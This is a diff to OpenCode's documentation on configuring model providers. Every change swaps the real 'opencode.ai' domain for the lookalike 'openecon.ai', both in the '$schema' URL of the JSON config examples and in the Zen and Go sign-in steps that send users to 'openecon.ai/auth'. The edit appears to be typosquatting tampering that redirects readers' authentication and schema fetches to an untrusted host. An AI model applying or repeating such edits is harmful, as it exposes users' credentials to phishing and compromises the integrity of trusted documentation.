@@ -35,7 +35,7 @@ You can customize the base URL for any provider by setting the `baseURL` option.
 
 ```json title="opencode.json" {6}
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "anthropic": {
       "options": {
@@ -57,7 +57,7 @@ tested and verified to work well with OpenCode. [Learn more](/docs/zen).
 If you are new, we recommend starting with OpenCode Zen.
 :::
 
-1. Run the `/connect` command in the TUI, select `OpenCode Zen`, and head to [opencode.ai/auth](https://opencode.ai/zen).
+1. Run the `/connect` command in the TUI, select `OpenCode Zen`, and head to [openecon.ai/auth](https://openecon.ai/zen).
 
    ```txt
    /connect
@@ -89,7 +89,7 @@ It works like any other provider in OpenCode and is completely optional to use.
 OpenCode Go is a low cost subscription plan that provides reliable access to popular open coding models provided by the OpenCode team that have been
 tested and verified to work well with OpenCode.
 
-1. Run the `/connect` command in the TUI, select `OpenCode Go`, and head to [opencode.ai/auth](https://opencode.ai/zen).
+1. Run the `/connect` command in the TUI, select `OpenCode Go`, and head to [openecon.ai/auth](https://openecon.ai/zen).
 
    ```txt
    /connect
@@ -199,7 +199,7 @@ To use Amazon Bedrock with OpenCode:
 
    ```json title="opencode.json"
    {
-     "$schema": "https://opencode.ai/config.json",
+     "$schema": "https://openecon.ai/config.json",
      "provider": {
        "amazon-bedrock": {
          "options": {
@@ -228,7 +228,7 @@ To use Amazon Bedrock with OpenCode:
 
    ```json title="opencode.json"
    {
-     "$schema": "https://opencode.ai/config.json",
+     "$schema": "https://openecon.ai/config.json",
      "provider": {
        "amazon-bedrock": {
          "options": {
@@ -277,7 +277,7 @@ For custom inference profiles, use the model and provider name in the key and se
 
 ```json title="opencode.json"
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "amazon-bedrock": {
       // ...
@@ -530,7 +530,7 @@ Cloudflare AI Gateway lets you access models from OpenAI, Anthropic, Workers AI,
 
    ```json title="opencode.json"
    {
-     "$schema": "https://opencode.ai/config.json",
+     "$schema": "https://openecon.ai/config.json",
      "provider": {
        "cloudflare-ai-gateway": {
          "models": {
@@ -736,7 +736,7 @@ to only use your own GitLab-hosted instance, add the following to your
 
 ```json
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "small_model": "gitlab/duo-chat-haiku-4-5",
   "share": "disabled"
 }
@@ -798,7 +798,7 @@ Customize through `opencode.json`:
 
 ```json title="opencode.json"
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "gitlab": {
       "options": {
@@ -819,7 +819,7 @@ To access GitLab tools (merge requests, issues, pipelines, CI/CD, etc.):
 
 ```json title="opencode.json"
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "plugin": ["@gitlab/opencode-gitlab-plugin"]
 }
 ```
@@ -1000,7 +1000,7 @@ Here's [Helicone's Model Directory](https://helicone.ai/models), you'll need thi
 
 ```jsonc title="~/.config/opencode/opencode.jsonc"
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "helicone": {
       "npm": "@ai-sdk/openai-compatible",
@@ -1028,7 +1028,7 @@ Helicone supports custom headers for features like caching, user tracking, and s
 
 ```jsonc title="~/.config/opencode/opencode.jsonc"
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "helicone": {
       "npm": "@ai-sdk/openai-compatible",
@@ -1082,7 +1082,7 @@ You can configure opencode to use local models through [llama.cpp's](https://git
 
 ```json title="opencode.json" "llama.cpp" {5, 6, 8, 10-15}
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "llama.cpp": {
       "npm": "@ai-sdk/openai-compatible",
@@ -1149,7 +1149,7 @@ You can configure opencode to use local models through LM Studio.
 
 ```json title="opencode.json" "lmstudio" {5, 6, 8, 10-14}
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "lmstudio": {
       "npm": "@ai-sdk/openai-compatible",
@@ -1270,7 +1270,7 @@ Ollama can automatically configure itself for OpenCode. See the [Ollama integrat
 
 ```json title="opencode.json" "ollama" {5, 6, 8, 10-14}
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "ollama": {
       "npm": "@ai-sdk/openai-compatible",
@@ -1432,7 +1432,7 @@ OpenCode Zen is a list of tested and verified models provided by the OpenCode te
 
    ```json title="opencode.json" {6}
    {
-     "$schema": "https://opencode.ai/config.json",
+     "$schema": "https://openecon.ai/config.json",
      "provider": {
        "openrouter": {
          "models": {
@@ -1447,7 +1447,7 @@ OpenCode Zen is a list of tested and verified models provided by the OpenCode te
 
    ```json title="opencode.json"
    {
-     "$schema": "https://opencode.ai/config.json",
+     "$schema": "https://openecon.ai/config.json",
      "provider": {
        "openrouter": {
          "models": {
@@ -1696,7 +1696,7 @@ You can also customize models through your opencode config. Here's an example of
 
 ```json title="opencode.json"
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "vercel": {
       "models": {
@@ -1806,7 +1806,7 @@ Some useful routing options:
 
    ```json title="opencode.json" {6}
    {
-     "$schema": "https://opencode.ai/config.json",
+     "$schema": "https://openecon.ai/config.json",
      "provider": {
        "zenmux": {
          "models": {
@@ -1874,7 +1874,7 @@ You can use any OpenAI-compatible provider with opencode. Most modern AI provide
 
    ```json title="opencode.json" ""myprovider"" {5-15}
    {
-     "$schema": "https://opencode.ai/config.json",
+     "$schema": "https://openecon.ai/config.json",
      "provider": {
        "myprovider": {
          "npm": "@ai-sdk/openai-compatible",
@@ -1912,7 +1912,7 @@ Here's an example setting the `apiKey`, `headers`, and model `limit` options.
 
 ```json title="opencode.json" {9,11,17-20}
 {
-  "$schema": "https://opencode.ai/config.json",
+  "$schema": "https://openecon.ai/config.json",
   "provider": {
     "myprovider": {
       "npm": "@ai-sdk/openai-compatible",
